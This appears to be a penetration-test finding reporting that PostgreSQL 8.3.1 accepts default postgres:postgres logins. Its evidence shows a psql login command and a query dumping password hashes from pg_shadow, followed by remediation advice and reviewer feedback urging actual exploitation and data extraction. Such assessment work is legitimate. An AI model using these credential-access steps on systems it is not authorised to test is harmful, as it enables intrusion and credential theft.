title: PostgreSQL Default Credentials (postgres:postgres)
description: PostgreSQL 8.3.1 accepts remote connections with default credentials (postgres:postgres). The postgres superuser has full database access including the ability to read password hashes from pg_shadow.
evidence:
PGPASSWORD=postgres psql -h 192.168.0.140 -U postgres:

SELECT version():
PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)

SELECT current_user:
postgres

SELECT usename, passwd FROM pg_shadow:
postgres | md53175bce1d3201d16594cebf9d7eb3f9d
remediation: Change the default postgres password immediately. Restrict remote access via pg_hba.conf. Disable trust authentication.

issues: HIGH severity finding should have stronger evidence
Exploitation proof required for high/critical findings
suggestions: Add command output demonstrating access or data extraction
For high findings, demonstrate actual impact
Actually exploit the vulnerability and capture output
For SQLi: Show extracted data or UNION-based output
